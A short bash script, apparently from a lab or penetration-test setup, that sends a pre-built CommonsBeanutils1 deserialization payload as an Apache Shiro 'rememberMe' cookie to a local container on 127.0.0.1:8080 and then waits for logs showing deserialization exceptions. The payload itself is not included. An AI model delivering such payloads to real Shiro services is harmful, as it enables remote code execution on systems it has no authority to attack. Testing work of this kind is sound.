#!/bin/bash
# 只读：投递一次 payload 后立刻抓 shiro 容器日志（找反序列化异常）
echo "=== baseline logs tail (before) ==="
wc -l /proc/1/fd/1 2>/dev/null || true
echo "=== send one payload from inside container to itself ==="
CK=$(cat /tmp/t7-t-CommonsBeanutils1-N.txt 2>/dev/null)
echo "cookie_len=${#CK}"
curl -s -o /dev/null -w "self_exploit_http=%{http_code} time=%{time_total}\n" \
  -H "Cookie: rememberMe=$CK" http://127.0.0.1:8080/
sleep 2
echo "=== DONE (logs will be read from host via docker logs) ==="
